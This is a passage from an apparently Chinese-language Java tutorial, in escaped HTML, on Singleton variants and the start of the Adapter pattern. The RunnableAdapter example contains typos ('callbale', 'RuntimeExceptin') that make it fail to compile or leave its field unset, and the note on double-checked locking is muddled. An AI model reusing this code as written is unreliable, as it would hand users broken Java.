&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Singleton&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 静态字段引用唯一实例
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Singleton&lt;/span> &lt;span style="color:#111">INSTANCE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Singleton&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 通过静态方法返回实例
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Singleton&lt;/span> &lt;span style="color:#75af00">getInstance&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">INSTANCE&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// private构造方法保证外部无法实例化
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#75af00">Singleton&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者直接把static变量暴露在外部&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Singleton&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 静态字段引用唯一实例 改为public
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Singleton&lt;/span> &lt;span style="color:#111">INSTANCE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Singleton&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// private构造方法保证外部无法实例化
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#75af00">Singleton&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>所以单例模式的实现方法很简单：&lt;/p>
&lt;ul>
&lt;li>只有&lt;code>private&lt;/code>构造方法，确保外部无法实例化&lt;/li>
&lt;li>通过&lt;code>private static&lt;/code>变量持有唯一实例，保证全局唯一性（构造静态方法返回实例）&lt;/li>
&lt;li>通过&lt;code>public static&lt;/code>变量返回此唯一实例，使外部调用方能获取到实例&lt;/li>
&lt;/ul>
&lt;p>Java标准库中的&lt;code>Runtime&lt;/code>就是单例（静态方法返回实例）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Runtime&lt;/span> &lt;span style="color:#111">runtime&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRuntime&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="延迟加载">延迟加载&lt;/h4>
&lt;p>即调用方第一次调用&lt;code>getInstance&lt;/code>时才初始化全局唯一实例&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Singleton&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Singleton&lt;/span> &lt;span style="color:#111">INSTANCE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Singleton&lt;/span> &lt;span style="color:#75af00">getInstance&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">INSTANCE&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">INSTANCE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Singleton&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">INSTANCE&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#75af00">Singleton&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>但是这样的写法在多线程中是错误的，在竞争条件下会创建出多个实例，必须对整个方法进行加锁&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">synchronized&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Singleton&lt;/span> &lt;span style="color:#75af00">getInstance&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">INSTANCE&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">INSTANCE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Singleton&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">INSTANCE&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>但是加锁会影响并发性能&lt;/p>
&lt;p>还有类似这样的双重检查：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Singleton&lt;/span> &lt;span style="color:#75af00">getInstance&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">INSTANCE&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">synchronized&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Singleton&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">INSTANCE&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">INSTANCE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Singleton&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">INSTANCE&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>由于java的内存模型，双重检查在这里也不存在；要实现真正的延迟加载只能通过java的ClassLoader来完成，如果没有特殊的需求，使用Singleton模式的时候，最好不要延迟加载，这样会使代码更简单&lt;/p>
&lt;h4 id="枚举">枚举&lt;/h4>
&lt;p>另一种实现Singleton的方法是利用java的&lt;code>enum&lt;/code>枚举类，因为java保证枚举类的每个枚举都是单例，所以我们只需要编写一个只有一个枚举的类即可&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">enum&lt;/span> &lt;span style="color:#111">World&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 唯一枚举
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">INSTANCE&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;word&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">setName&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>枚举类也可以像其它类那样定义自己的字段、方法，比如我们可以这样调用&lt;code>World&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">World&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">INSTANCE&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>使用枚举实现Singleton还避免了第一种方式实现Singleton的一个潜在问题，即序列化和反序列化会绕过普通类的&lt;code>private&lt;/code>构造方法从而创建出多个实例，而枚举类就没有这个问题&lt;/p>
&lt;h2 id="结构型模式">结构型模式&lt;/h2>
&lt;p>结构型模式不仅仅简单地使用继承，而更多地通过组合与运行期的动态组合来实现更灵活的功能&lt;/p>
&lt;h3 id="适配器adapterwrapper">适配器Adapter/Wrapper&lt;/h3>
&lt;p>近似理解为充电器转接口，将A接口转换为B接口；或者可以理解为接口的强制类型转换（近似）&lt;/p>
&lt;p>举例：已有一个实现了&lt;code>Callable&lt;/code>接口的&lt;code>Task&lt;/code>类&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Task&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Callable&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Long&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">long&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Task&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">long&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">num&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">num&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">Long&lt;/span> &lt;span style="color:#75af00">call&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">long&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">long&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">num&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">++)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Result: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>现在想通过一个线程来执行&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Callable&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Long&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">callable&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Task&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">123450000L&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Thread&lt;/span> &lt;span style="color:#111">thread&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Thread&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">callable&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">thread&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>但是无法编译通过，因为&lt;code>Thread&lt;/code>接收&lt;code>Runnable&lt;/code>接口 不接收&lt;code>Callable&lt;/code>接口&lt;/p>
&lt;p>一个办法是将&lt;code>Task&lt;/code>类改为继承&lt;code>Runnable&lt;/code>，但可能会影响其它代码的正常运行；另一个办法是使用Adapter，把这个&lt;code>Callable&lt;/code>接口变为&lt;code>Runnable&lt;/code>接口&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RunnableAdapter&lt;/span> &lt;span style="color:#00a8c8">implements&lt;/span> &lt;span style="color:#111">Runnable&lt;/span>&lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 实现目标接口
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// 引用待转换接口
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">Callable&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">callable&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">RunnableAdapter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Callable&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&amp;gt;&lt;/span> &lt;span style="color:#111">callbale&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">callable&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">callable&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 实现指定接口
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 实现被转换接口的方法
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">callable&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">call&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">catch&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">RuntimeExceptin&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Callable&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">Long&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">callable&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Task&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">123450000L&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
